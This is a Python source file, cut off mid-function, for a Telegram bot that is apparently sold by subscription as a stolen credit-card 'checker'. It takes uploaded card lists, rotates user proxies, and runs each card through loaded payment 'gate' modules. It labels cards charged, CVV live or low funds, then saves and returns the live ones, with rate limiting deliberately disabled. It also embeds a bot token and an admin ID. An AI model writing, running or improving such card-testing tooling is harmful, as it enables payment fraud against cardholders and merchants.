import requests
import telebot, time, json
from datetime import datetime, timedelta
from telebot import types
import importlib
import random
import os
from concurrent.futures import ThreadPoolExecutor, TimeoutError
import sqlite3
from contextlib import contextmanager
import threading
import glob
from queue import Queue
import logging
from functools import lru_cache
import hashlib
import re

# --- LOGGING ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# --- HTML CLEANER ---
def clean_html(text):
    """Remove HTML tags and clean text for Telegram"""
    if not text:
        return "N/A"
    text = str(text)
    # Remove HTML tags
    text = re.sub(r'<[^>]+>', '', text)
    # Remove DOCTYPE
    text = re.sub(r'<!DOCTYPE[^>]*>', '', text, flags=re.IGNORECASE)
    text = re.sub(r'<!doctype[^>]*>', '', text, flags=re.IGNORECASE)
    # Remove extra whitespace
    text = re.sub(r'\s+', ' ', text).strip()
    # Escape special characters
    text = text.replace('&', '&amp;')
    text = text.replace('<', '&lt;')
    text = text.replace('>', '&gt;')
    # Limit length
    if len(text) > 300:
        text = text[:297] + '...'
    return text if text else "N/A"

# --- DATABASE WITH CONNECTION POOLING ---
class DatabasePool:
    def __init__(self, db_file, max_connections=10):
        self.db_file = db_file
        self.max_connections = max_connections
        self._connections = Queue(maxsize=max_connections)
        self._lock = threading.Lock()
        
        for _ in range(max_connections):
            conn = sqlite3.connect(db_file, check_same_thread=False, timeout=30)
            conn.row_factory = sqlite3.Row
            conn.execute('PRAGMA journal_mode=WAL')
            conn.execute('PRAGMA busy_timeout=30000')
            self._connections.put(conn)
    
    @contextmanager
    def get_connection(self):
        conn = self._connections.get()
        try:
            yield conn
            conn.commit()
        except Exception as e:
            conn.rollback()
            logger.error(f"Database error: {e}")
            raise
        finally:
            self._connections.put(conn)
    
    def close_all(self):
        while not self._connections.empty():
            conn = self._connections.get()
            conn.close()

# Initialize database pool
db_pool = DatabasePool('bot_database.db', max_connections=20)

def init_database():
    with db_pool.get_connection() as conn:
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id TEXT PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                vip_expiry TEXT,
                is_admin INTEGER DEFAULT 0,
                total_checks INTEGER DEFAULT 0,
                total_hits INTEGER DEFAULT 0,
                total_cvv INTEGER DEFAULT 0,
                total_low INTEGER DEFAULT 0,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP,
                last_active TEXT,
                proxy_url TEXT
            )
        ''')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_users_vip ON users(vip_expiry)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_users_active ON users(last_active)')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS usage_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id TEXT,
                cc TEXT,
                status TEXT,
                gate_name TEXT,
                bank TEXT,
                country TEXT,
                response TEXT,
                proxy_used TEXT,
                execution_time REAL,
                checked_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_logs_user ON usage_logs(user_id)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_logs_status ON usage_logs(status)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_logs_time ON usage_logs(checked_at)')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS vip_plans (
                plan_id TEXT PRIMARY KEY,
                plan_name TEXT,
                price REAL,
                days INTEGER,
                is_active INTEGER DEFAULT 1
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS rate_limits (
                user_id TEXT PRIMARY KEY,
                last_check TEXT,
                check_count INTEGER DEFAULT 0,
                daily_count INTEGER DEFAULT 0,
                daily_date TEXT
            )
        ''')
        
        default_plans = [
            ('1_month', '1 Month', 10, 30),
            ('3_months', '3 Months', 25, 90),
            ('1_year', '1 Year', 80, 365)
        ]
        
        for plan in default_plans:
            cursor.execute('''
                INSERT OR IGNORE INTO vip_plans (plan_id, plan_name, price, days)
                VALUES (?, ?, ?, ?)
            ''', plan)
        
        conn.commit()
        logger.info("Database initialized successfully")

# --- RATE LIMITING (DISABLED - UNLIMITED) ---
class RateLimiter:
    def __init__(self):
        self.max_checks_per_minute = 999999
        self.max_checks_per_day = 999999
        self._lock = threading.Lock()
    
    def check_limit(self, user_id):
        # Rate limiting is disabled - always return True
        return True, "OK"

# Initialize rate limiter
rate_limiter = RateLimiter()

# --- PROXY MANAGER ---
class ProxyManager:
    def __init__(self):
        self.user_proxies = {}
        self.user_proxy_index = {}
        self.locks = {}
        self.proxy_cache = {}
        self.cache_lock = threading.Lock()
    
    def load_user_proxy(self, user_id):
        user_id_str = str(user_id)
        
        with self.cache_lock:
            if user_id_str in self.proxy_cache:
                proxy_url = self.proxy_cache[user_id_str]
                if proxy_url:
                    self._set_proxy_memory(user_id_str, proxy_url)
                    return True
        
        with db_pool.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('SELECT proxy_url FROM users WHERE user_id = ?', (user_id_str,))
            result = cursor.fetchone()
            if result and result['proxy_url']:
                proxy_url = result['proxy_url']
                
                with self.cache_lock:
                    self.proxy_cache[user_id_str] = proxy_url
                
                self._set_proxy_memory(user_id_str, proxy_url)
                return True
        return False
    
    def _set_proxy_memory(self, user_id, proxy_url):
        if '://' in proxy_url:
            proxy_dict = {
                'http': proxy_url,
                'https': proxy_url
            }
        else:
            proxy_dict = {
                'http': f'http://{proxy_url}',
                'https': f'http://{proxy_url}'
            }
        
        if user_id not in self.user_proxies:
            self.user_proxies[user_id] = []
            self.user_proxy_index[user_id] = 0
            self.locks[user_id] = threading.Lock()
        
        with self.locks[user_id]:
            self.user_proxies[user_id] = [proxy_dict]
            self.user_proxy_index[user_id] = 0
    
    def set_user_proxy(self, user_id, proxy_url):
        user_id_str = str(user_id)
        
        with db_pool.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE users 
                SET proxy_url = ?
                WHERE user_id = ?
            ''', (proxy_url, user_id_str))
            conn.commit()
        
        with self.cache_lock:
            self.proxy_cache[user_id_str] = proxy_url
        
        self._set_proxy_memory(user_id_str, proxy_url)
        logger.info(f"Proxy set for user {user_id_str}: {proxy_url}")
    
    def set_user_proxy_list(self, user_id, proxy_list):
        user_id_str = str(user_id)
        proxies = []
        
        for proxy in proxy_list:
            proxy = proxy.strip()
            if not proxy:
                continue
            
            if '://' in proxy:
                proxy_url = proxy
            else:
                proxy_url = f'http://{proxy}'
            
            proxies.append({
                'http': proxy_url,
                'https': proxy_url
            })
        
        if proxies:
            if user_id_str not in self.user_proxies:
                self.user_proxies[user_id_str] = []
                self.user_proxy_index[user_id_str] = 0
                self.locks[user_id_str] = threading.Lock()
            
            with self.locks[user_id_str]:
                self.user_proxies[user_id_str] = proxies
                self.user_proxy_index[user_id_str] = 0
            
            proxy_urls = [p['http'] for p in proxies]
            with db_pool.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute('''
                    UPDATE users 
                    SET proxy_url = ?
                    WHERE user_id = ?
                ''', (json.dumps(proxy_urls), user_id_str))
                conn.commit()
            
            with self.cache_lock:
                self.proxy_cache[user_id_str] = json.dumps(proxy_urls)
            
            logger.info(f"{len(proxies)} proxies loaded for user {user_id_str}")
            return len(proxies)
        return 0
    
    def get_proxy_dict(self, user_id):
        user_id_str = str(user_id)
        
        if user_id_str in self.user_proxies and self.user_proxies[user_id_str]:
            with self.locks[user_id_str]:
                proxies = self.user_proxies[user_id_str]
                if proxies:
                    idx = self.user_proxy_index[user_id_str]
                    proxy = proxies[idx]
                    self.user_proxy_index[user_id_str] = (idx + 1) % len(proxies)
                    return proxy
        return None
    
    def get_current_proxy_url(self, user_id):
        user_id_str = str(user_id)
        if user_id_str in self.user_proxies and self.user_proxies[user_id_str]:
            with self.locks[user_id_str]:
                proxies = self.user_proxies[user_id_str]
                if proxies:
                    idx = self.user_proxy_index[user_id_str]
                    return proxies[idx]['http']
        return None
    
    def remove_user_proxy(self, user_id):
        user_id_str = str(user_id)
        if user_id_str in self.user_proxies:
            del self.user_proxies[user_id_str]
        if user_id_str in self.user_proxy_index:
            del self.user_proxy_index[user_id_str]
        if user_id_str in self.locks:
            del self.locks[user_id_str]
        
        with self.cache_lock:
            if user_id_str in self.proxy_cache:
                del self.proxy_cache[user_id_str]
        
        with db_pool.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE users 
                SET proxy_url = NULL
                WHERE user_id = ?
            ''', (user_id_str,))
            conn.commit()
        
        logger.info(f"Proxy removed for user {user_id_str}")

# Initialize proxy manager
proxy_manager = ProxyManager()

# --- BOT CONFIGURATION ---
token = '8910582957:AAEtLRnEePDQ-xA81fOGMjyWpG8NeOzbzP0'
ADMIN_ID = 5831292144
CHANNEL_ID = '-1003763847738' 

RESULTS_DIR = "results"
if not os.path.exists(RESULTS_DIR):
    os.makedirs(RESULTS_DIR)

DB_FILE = 'bot_database.db'
bot = telebot.TeleBot(token, parse_mode="HTML")

# Initialize database
init_database()

# Premium emoji IDs
PREMIUM_EMOJI_IDS = {
    "✅": "6023660820544623088", "🔥": "5220166546491459639", "❌": "6037570896766438989",
    "🐇": "6199501437387412202", "💳": "5472250091332993630", "💠": "5971837723676249096",
    "📝": "5258500400918587241", "🌐": "4956560549287560231", "🎯": "5287535694099536694",
    "🤖": "5927026418616636353", "🤵": "4949560993840629085", "💰": "5971944878815317190",
    "⏸️": "6001440193058444284", "▶️": "6285315214673975495", "🛑": "5420323339723881652",
    "📊": "6032808241891644148", "📦": "6066395745139824604", "📋": "5974235702701853774",
    "🔄": "5971837723676249096", "⏳": "5971837723676249096", "🚀": "6235302918967269680",
    "⚠️": "5420323339723881652", "💎": "4956739572114392015", "📅": "6066395745139824604",
    "⚙️": "6264791387032523779", "➡️": "4918408122868958076", "🏦": "5424887227807188349",
    "🌍": "6188045471118790922", "👨‍💻": "5942623248754676762",
}

def get_emj(emoji_char):
    if emoji_char in PREMIUM_EMOJI_IDS:
        return f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS[emoji_char]}">{emoji_char}</tg-emoji>'
    return emoji_char

# Load gate modules
GATE_MODULES = []
for gate_file in glob.glob('gatet*.py'):
    module_name = gate_file.replace('.py', '')
    try: 
        module = importlib.import_module(module_name)
        GATE_MODULES.append(module)
        logger.info(f"Loaded gate module: {module_name}")
    except Exception as e: 
        logger.error(f"Failed to load {module_name}: {e}")

# --- GLOBAL THREAD POOL ---
class GlobalThreadPool:
    def __init__(self, max_workers=20):
        self.executor = ThreadPoolExecutor(max_workers=max_workers)
        self.active_tasks = {}
        self.lock = threading.Lock()
    
    def submit(self, user_id, fn, *args, **kwargs):
        with self.lock:
            if user_id not in self.active_tasks:
                self.active_tasks[user_id] = []
            
            future = self.executor.submit(fn, *args, **kwargs)
            self.active_tasks[user_id].append(future)
            
            self.active_tasks[user_id] = [f for f in self.active_tasks[user_id] if not f.done()]
            
            return future
    
    def cancel_user_tasks(self, user_id):
        with self.lock:
            if user_id in self.active_tasks:
                for future in self.active_tasks[user_id]:
                    future.cancel()
                del self.active_tasks[user_id]
                logger.info(f"Cancelled tasks for user {user_id}")

# Initialize global thread pool
thread_pool = GlobalThreadPool(max_workers=30)

# --- USER FUNCTIONS ---
@lru_cache(maxsize=1000)
def get_user_data_cached(user_id):
    with db_pool.get_connection() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM users WHERE user_id = ?', (str(user_id),))
        return cursor.fetchone()

def get_user_data(user_id):
    return get_user_data_cached(user_id)

def create_or_update_user(user_id, username=None, first_name=None, last_name=None):
    with db_pool.get_connection() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT user_id FROM users WHERE user_id = ?', (str(user_id),))
        exists = cursor.fetchone()
        
        if exists:
            cursor.execute('''
                UPDATE users 
                SET username = ?, first_name = ?, last_name = ?, last_active = CURRENT_TIMESTAMP
                WHERE user_id = ?
            ''', (username, first_name, last_name, str(user_id)))
        else:
            cursor.execute('''
                INSERT INTO users (user_id, username, first_name, last_name, last_active)
                VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
            ''', (str(user_id), username, first_name, last_name))
        
        conn.commit()
        get_user_data_cached.cache_clear()

def is_user_allowed(user_id):
    user_id_str = str(user_id)
    if user_id_str == str(ADMIN_ID):
        return True
    
    user = get_user_data(user_id_str)
    if not user:
        return False
    
    if user['vip_expiry']:
        try:
            expiry_date = datetime.strptime(user['vip_expiry'], '%Y-%m-%d %H:%M:%S')
            if datetime.now() < expiry_date:
                return True
        except:
            pass
    
    return False

def add_vip_user(user_id, days):
    expiry_date = datetime.now() + timedelta(days=days)
    expiry_str = expiry_date.strftime('%Y-%m-%d %H:%M:%S')
    
    with db_pool.get_connection() as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO users (user_id, vip_expiry, last_active)
            VALUES (?, ?, CURRENT_TIMESTAMP)
        ''', (str(user_id), expiry_str))
        conn.commit()
    
    get_user_data_cached.cache_clear()

def log_usage(user_id, cc, status, gate_name, bank, country, response, proxy_used, execution_time):
    try:
        with db_pool.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO usage_logs (user_id, cc, status, gate_name, bank, country, response, proxy_used, execution_time)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (str(user_id), cc[:6] + '****' + cc[-4:], status, gate_name, bank, country, clean_html(response)[:200], proxy_used, execution_time))
            
            cursor.execute('''
                UPDATE users 
                SET total_checks = total_checks + 1,
                    last_active = CURRENT_TIMESTAMP
                WHERE user_id = ?
            ''', (str(user_id),))
            
            if status == 'hit':
                cursor.execute('UPDATE users SET total_hits = total_hits + 1 WHERE user_id = ?', (str(user_id),))
            elif status == 'cvv':
                cursor.execute('UPDATE users SET total_cvv = total_cvv + 1 WHERE user_id = ?', (str(user_id),))
            elif status == 'low':
                cursor.execute('UPDATE users SET total_low = total_low + 1 WHERE user_id = ?', (str(user_id),))
            
            conn.commit()
    except Exception as e:
        logger.error(f"Logging error: {e}")

# --- CORE FUNCTIONS ---
active_checks = {}

def is_card_expired(cc):
    try:
        parts = cc.split("|")
        if len(parts) >= 3:
            exp_month = parts[1].strip()
            exp_year_raw = parts[2].strip()
            if len(exp_year_raw) == 2:
                exp_year = 2000 + int(exp_year_raw)
            else:
                exp_year = int(exp_year_raw)
            exp_month_int = int(exp_month)
            current_date = datetime.now()
            current_year = current_date.year
            current_month = current_date.month
            if exp_year < current_year:
                return True
            elif exp_year == current_year and exp_month_int < current_month:
                return True
    except:
        pass
    return False

def save_result_to_file(cc, status_type, bank, country, gate_name):
    try:
        file_path_hit = os.path.join(RESULTS_DIR, "hit.txt")
        file_path_low = os.path.join(RESULTS_DIR, "low.txt")
        file_path_cvv = os.path.join(RESULTS_DIR, "cvv.txt")
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        line = f"{cc}|{bank}|{country}|{gate_name}|{timestamp}\n"
        
        with threading.Lock():
            if status_type == "hit":
                with open(file_path_hit, 'a', encoding='utf-8') as f:
                    f.write(line)
            elif status_type == "low":
                with open(file_path_low, 'a', encoding='utf-8') as f:
                    f.write(line)
            elif status_type == "cvv":
                with open(file_path_cvv, 'a', encoding='utf-8') as f:
                    f.write(line)
    except Exception as e:
        logger.error(f"File save error: {e}")

def send_result_files(chat_id):
    hit_path = os.path.join(RESULTS_DIR, "hit.txt")
    low_path = os.path.join(RESULTS_DIR, "low.txt")
    cvv_path = os.path.join(RESULTS_DIR, "cvv.txt")
    
    try:
        if os.path.exists(hit_path) and os.path.getsize(hit_path) > 0:
            with open(hit_path, 'rb') as f:
                bot.send_document(chat_id, f, caption=f"{get_emj('🔥')} <b>HIT RESULTS</b>")
            open(hit_path, 'w').close()
        
        if os.path.exists(low_path) and os.path.getsize(low_path) > 0:
            with open(low_path, 'rb') as f:
                bot.send_document(chat_id, f, caption=f"{get_emj('💰')} <b>LOW FUND RESULTS</b>")
            open(low_path, 'w').close()
        
        if os.path.exists(cvv_path) and os.path.getsize(cvv_path) > 0:
            with open(cvv_path, 'rb') as f:
                bot.send_document(chat_id, f, caption=f"{get_emj('💎')} <b>CVV LIVE RESULTS</b>")
            open(cvv_path, 'w').close()
    except Exception as e:
        logger.error(f"Send file error: {e}")

def update_ui(message, stats):
    if stats.get('stop_event', False): 
        return
    
    try:
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton(f"✅ CHARGED: {stats['ch']}", callback_data='n'),
            types.InlineKeyboardButton(f"💳 CCN: {stats['ccn']}", callback_data='n'),
            types.InlineKeyboardButton(f"💎 CVV: {stats['cvv']}", callback_data='n'),
            types.InlineKeyboardButton(f"💰 LOW: {stats['low']}", callback_data='n'),
            types.InlineKeyboardButton(f"❌ DECLINED: {stats['dd']}", callback_data='n'),
            types.InlineKeyboardButton(f"📊 PROGRESS: {stats['checked']}/{stats['total']}", callback_data='n'),
            types.InlineKeyboardButton(f"🛑 STOP", callback_data='stop')
        )
        
        last_cc = stats.get('last_cc', 'N/A')
        last_gate = stats.get('last_gate', 'N/A')
        last_resp = clean_html(stats.get('last_resp', 'Waiting...'))
        last_proxy = stats.get('last_proxy', 'N/A')
        
        text = f"""
{get_emj('🔄')} <b>FAST CHECKING IN PROGRESS...</b>
<b>━━━━━━━━━━━━━━</b>
{get_emj('💳')} <b>LAST CC:</b> <code>{last_cc}</code>
{get_emj('🎯')} <b>GATE:</b> <code>{last_gate}</code>
{get_emj('📝')} <b>RESP:</b> <code>{last_resp}</code>
{get_emj('🌐')} <b>PROXY:</b> <code>{last_proxy}</code>
<b>━━━━━━━━━━━━━━</b>
<b>BY: @cyber_404io</b>
"""
        bot.edit_message_text(chat_id=message.chat.id, message_id=stats['msg_id'], text=text, reply_markup=markup)
    except Exception as e:
        logger.error(f"UI update error: {e}")

def process_cc(cc, message, stats):
    if stats.get('stop_event', False): 
        return
    
    cc = cc.strip()
    if not cc: 
        return
    
    if is_card_expired(cc):
        stats['checked'] += 1
        return
    
    stats['last_cc'] = cc
    
    # Rate limit is disabled - always allowed
    # allowed, msg = rate_limiter.check_limit(message.chat.id)
    # if not allowed:
    #     stats['stop_event'] = True
    #     bot.send_message(message.chat.id, f"⚠️ {msg}")
    #     return
    
    proxy = proxy_manager.get_proxy_dict(message.chat.id)
    proxy_url = proxy_manager.get_current_proxy_url(message.chat.id) or "Direct Connection"
    stats['last_proxy'] = proxy_url
    
    try: 
        response = requests.get('https://bins.antipublic.cc/bins/'+cc[:6], timeout=5, proxies=proxy)
        data = response.json()
    except: 
        data = {}
    
    country = data.get('country_name', 'Unknown')
    flag = data.get('country_flag', 'Unknown')
    bank = data.get('bank', 'Unknown')
    
    start_time = time.time()
    gate_name = "N/A"
    last = "Error"
    
    if GATE_MODULES:
        random_gate = random.choice(GATE_MODULES)
        gate_name = random_gate.__name__
        stats['last_gate'] = gate_name
        try:
            if hasattr(random_gate, 'set_proxy'):
                random_gate.set_proxy(proxy)
            
            last_raw = str(random_gate.Tele(cc))
            if '"message":' in last_raw:
                try: 
                    last = json.loads(last_raw)['error'].get('message', last_raw)
                except: 
                    last = last_raw
            else: 
                last = last_raw if last_raw != "0" else "Site Rejected"
        except Exception as e:
            last = "Gateway Error"
            logger.error(f"Gate error: {e}")
    
    # Clean HTML from response
    last = clean_html(last)
    stats['last_resp'] = last
    execution_time = time.time() - start_time
    last_lower = last.lower()
    
    is_hit = False
    is_low = False
    is_3ds = False
    
    hit_k = ['thank', 'success":true', 'thank-you', 'successful', 'successful!', 'confirmed', 'paid', 'transaction_id']
    low_k = ['insufficient funds', 'low funds', 'money', 'balance']
    three_k = ['additional action', 'authenticate', '3d_secure', 'verification required', 'challenge_required', 'initstripescamodal', 'client_secret', 'strong customer authentication']
    
    if any(k in last_lower for k in three_k): 
        is_3ds = True
        last = "3D Authentication Required"
    elif any(k in last_lower for k in hit_k) and '"success":false' not in last_lower and 'error' not in last_lower: 
        is_hit = True
        last = "Transaction Successful" if "success" in last_lower else last
    elif any(k in last_lower for k in low_k): 
        is_low = True
        last = "Insufficient Funds"
    
    user_fname = message.from_user.first_name
    user_uname = f"@{message.from_user.username}" if message.from_user.username else "No Username"
    user_display = f"{user_fname} ({user_uname})"
    
    status_text = "HIT FOUND!" if is_hit else "CVV LIVE!" if is_3ds else "LOW FUNDS!"
    status_emoji = get_emj('🔥') if is_hit else get_emj('💎') if is_3ds else get_emj('💰')
    
    hit_msg = f"""
<b>{status_emoji} {status_text} {status_emoji}</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>{get_emj('💳')} CARD     {get_emj('➡️')}</b> <code>{cc}</code>
<b>{get_emj('📝')} STATUS   {get_emj('➡️')}</b> <code>{last}</code>
<b>{get_emj('🏦')} BANK     {get_emj('➡️')}</b> <code>{bank}</code>
<b>{get_emj('🌍')} COUNTRY  {get_emj('➡️')}</b> <code>{country} {flag}</code>
<b>{get_emj('⚙️')} GATE     {get_emj('➡️')}</b> <code>{gate_name}</code>
<b>{get_emj('🌐')} PROXY    {get_emj('➡️')}</b> <code>{proxy_url}</code>
<b>{get_emj('⏳')} TIME     {get_emj('➡️')}</b> <code>{execution_time:.1f}s</code>
<b>━━━━━━━━━━━━━━━━━</b>
<b>{get_emj('👨‍💻')} BY       {get_emj('➡️')}</b> <a href="https://t.me/cyber_404io">@cyber_404io</a>
"""
    status_type = None
    
    if is_hit: 
        stats['ch'] += 1
        status_type = "hit"
        bot.reply_to(message, hit_msg)
        save_result_to_file(cc, "hit", bank, country, gate_name)
    elif is_low: 
        stats['low'] += 1
        status_type = "low"
        bot.reply_to(message, hit_msg)
        save_result_to_file(cc, "low", bank, country, gate_name)
    elif is_3ds: 
        stats['cvv'] += 1
        status_type = "cvv"
        bot.reply_to(message, hit_msg)
        save_result_to_file(cc, "cvv", bank, country, gate_name)
    elif 'security code is incorrect' in last_lower or 'cvc_check_failure' in last_lower: 
        stats['ccn'] += 1
        status_type = "ccn"
    elif 'Your card does not support this type of purchase' in last_lower or 'transaction_not_allowed' in last_lower: 
        stats['cvv'] += 1
        status_type = "cvv"
        save_result_to_file(cc, "cvv", bank, country, gate_name)
    else: 
        stats['dd'] += 1
        status_type = "declined"
    
    if status_type:
        thread_pool.submit('logging', log_usage, message.chat.id, cc, status_type, gate_name, bank, country, last, proxy_url, execution_time)
    
    stats['checked'] += 1
    if stats['checked'] % 5 == 0 or stats['checked'] == stats['total']: 
        update_ui(message, stats)

def process_card_file(message, cards):
    user_id = message.chat.id
    
    if user_id not in proxy_manager.user_proxies:
        proxy_manager.load_user_proxy(user_id)
    
    # Rate limit is disabled
    # allowed, msg = rate_limiter.check_limit(user_id)
    # if not allowed:
    #     bot.reply_to(message, f"⚠️ {msg}")
    #     return
    
    thread_pool.cancel_user_tasks(user_id)
    
    ko = bot.reply_to(message, f"{get_emj('⏳')} <b>STARTING FAST CHECKER...</b>").message_id
    
    stats = {
        'ch': 0, 'ccn': 0, 'cvv': 0, 'low': 0, 'dd': 0,
        'checked': 0, 'total': len(cards), 'msg_id': ko,
        'stop_event': False, 'last_cc': 'N/A', 'last_gate': 'N/A', 
        'last_resp': 'Waiting...', 'last_proxy': 'N/A'
    }
    active_checks[user_id] = stats
    update_ui(message, stats)
    
    futures = []
    # Optimized delay - 0.02 seconds for faster processing while avoiding API limits
    for cc in cards:
        if stats['stop_event']: 
            break
        future = thread_pool.submit(user_id, process_cc, cc, message, stats)
        futures.append(future)
        time.sleep(0.1)  # 0.02 sec delay - balances speed and API limits
    
    for future in futures:
        try:
            future.result(timeout=30)
        except Exception as e:
            logger.error(f"Task error: {e}")
    
    active_checks.pop(user_id, None)
    
    final_text = f"{get_emj('🛑')} <b>STOPPED BY USER</b>" if stats['stop_event'] else f"{get_emj('✅')} <b>FAST CHECKING COMPLETED!</b>"
    final_markup = types.InlineKeyboardMarkup(row_width=1)
    final_markup.add(
        types.InlineKeyboardButton(f"✅ {stats['ch']}", callback_data='n'),
        types.InlineKeyboardButton(f"💳 {stats['ccn']}", callback_data='n'),
        types.InlineKeyboardButton(f"💎 {stats['cvv']}", callback_data='n'),
        types.InlineKeyboardButton(f"💰 {stats['low']}", callback_data='n'),
        types.InlineKeyboardButton(f"❌ {stats['dd']}", callback_data='n')
    )
    try: 
        bot.edit_message_text(chat_id=user_id, message_id=ko, text=final_text, reply_markup=final_markup)
    except: 
        pass
    
    send_result_files(user_id)

# --- BOT COMMANDS ---
@bot.message_handler(commands=["start"])
def start(message):
    user_id = message.chat.id
    create_or_update_user(
        user_id,
        message.from_user.username,
        message.from_user.first_name,
        message.from_user.last_name
    )
    
    proxy_manager.load_user_proxy(user_id)
    
    is_admin = str(user_id) == str(ADMIN_ID)
    status = f"{get_emj('🤵')} OWNER" if is_admin else (f"{get_emj('💎')} VIP USER" if is_user_allowed(user_id) else f"{get_emj('❌')} UNAUTHORIZED")
    
    user = get_user_data(user_id)
    expiry = "LIFETIME" if is_admin else (user['vip_expiry'] if user else 'N/A')
    
    with db_pool.get_connection() as conn:
        cursor = conn.cursor()
        cursor.execute('''
            SELECT 
                total_checks, total_hits, total_cvv, total_low
            FROM users WHERE user_id = ?
        ''', (str(user_id),))
        stats = cursor.fetchone()
    
    welcome_msg = f"""
{get_emj('🚀')} <b>WELCOME TO GOOD HQ BOT</b> {get_emj('🚀')}
━━━━━━━━━━━━━━━━━━━━━━━━
{get_emj('💠')} <b>USER ID:</b> <code>{user_id}</code>
{get_emj('📊')} <b>STATUS:</b> <code>{status}</code>
{get_emj('⏳')} <b>EXPIRY:</b> <code>{expiry}</code>
{get_emj('📊')} <b>STATS:</b> 
  ➜ Checks: {stats['total_checks'] if stats else 0}
  ➜ Hits: {stats['total_hits'] if stats else 0}
  ➜ CVV: {stats['total_cvv'] if stats else 0}
  ➜ Low: {stats['total_low'] if stats else 0}
━━━━━━━━━━━━━━━━━━━━━━━━
{get_emj('🎮')} <b>USER COMMANDS:</b>
➜ Send File (.txt) - Start FAST checking
➜ /vipplans - Show VIP pricing
➜ /start - Check your status
➜ /mystats - View your stats
➜ /setproxy [proxy] - Set your proxy
➜ /removeproxy - Remove your proxy
➜ /proxyinfo - Check proxy status

{get_emj('🤵')} <b>ADMIN COMMANDS:</b> (Admin Only)
➜ /addvip [user_id] [days] - Add VIP
➜ /broadcast [message] - Message all users
➜ /adminstats - View all user stats
━━━━━━━━━━━━━━━━━━━━━━━━
{get_emj('🌐')} <b>CHANNEL: @cyber_404io</b>
"""
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton(f"📢 CHANNEL", url="https://t.me/cyber_404io"),
        types.InlineKeyboardButton(f"👤 OWNER", url=f"tg://user?id={ADMIN_ID}")
    )
    bot.reply_to(message, welcome_msg, reply_markup=markup)

@bot.message_handler(commands=["mystats"])
def mystats(message):
    user_id = message.chat.id
    
    with db_pool.get_connection() as conn:
        cursor = conn.cursor()
        cursor.execute('''
            SELECT 
                total_checks, total_hits, total_cvv, total_low
            FROM users WHERE user_id = ?
        ''', (str(user_id),))
        user_stats = cursor.fetchone()
        
        cursor.execute('''
            SELECT status, COUNT(*) as count 
            FROM usage_logs 
            WHERE user_id = ? 
            GROUP BY status
        ''', (str(user_id),))
        status_stats = cursor.fetchall()
    
    if not user_stats:
        bot.reply_to(message, f"{get_emj('❌')} No data found.")
        return
    
    stats_dict = {
        'total_checks': user_stats['total_checks'],
        'total_hits': user_stats['total_hits'],
        'total_cvv': user_stats['total_cvv'],
        'total_low': user_stats['total_low']
    }
    
    for stat in status_stats:
        stats_dict[stat['status']] = stat['count']
    
    text = f"""
{get_emj('📊')} <b>YOUR STATISTICS</b> {get_emj('📊')}
━━━━━━━━━━━━━━━━━━━━━━━━
{get_emj('🔄')} Total Checks: <code>{stats_dict['total_checks']}</code>
{get_emj('🔥')} Hits: <code>{stats_dict.get('hit', 0)}</code>
{get_emj('💎')} CVV: <code>{stats_dict.get('cvv', 0)}</code>
{get_emj('💰')} Low Funds: <code>{stats_dict.get('low', 0)}</code>
{get_emj('❌')} Declined: <code>{stats_dict.get('declined', 0)}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
{get_emj('📊')} <b>LIFETIME STATS:</b>
  ➜ Total Hits: <code>{stats_dict['total_hits']}</code>
  ➜ Total CVV: <code>{stats_dict['total_cvv']}</code>
  ➜ Total Low: <code>{stats_dict['total_low']}</code>
"""
    bot.reply_to(message, text)

@bot.message_handler(commands=["vipplans"])
def vipplans(message):
    with db_pool.get_connection() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM vip_plans WHERE is_active = 1 ORDER BY days')
        plans = cursor.fetchall()
    
    text = f"{get_emj('💎')} <b>VIP SUBSCRIPTION PLANS</b> {get_emj('💎')}\n━━━━━━━━━━━━━━━━━━━━━━━━\n"
    for plan in plans:
        text += f"➜ <b>{plan['plan_name']}:</b> ${plan['price']} ({plan['days']} Days)\n"
    text += "\n━━━━━━━━━━━━━━━━━━━━━━━━\n🤵 <b>Contact @cyber_404io to Buy!</b>"
    bot.reply_to(message, text)

@bot.message_handler(commands=["addvip"])
def add_vip(message):
    if str(message.chat.id) != str(ADMIN_ID): 
        return
    
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "Usage: <code>/addvip [user_id] [days]</code>")
        return
    
    target_id = args[1]
    days = int(args[2])
    add_vip_user(target_id, days)
    
    expiry_date = datetime.now() + timedelta(days=days)
    expiry_str = expiry_date.strftime('%Y-%m-%d %H:%M:%S')
    
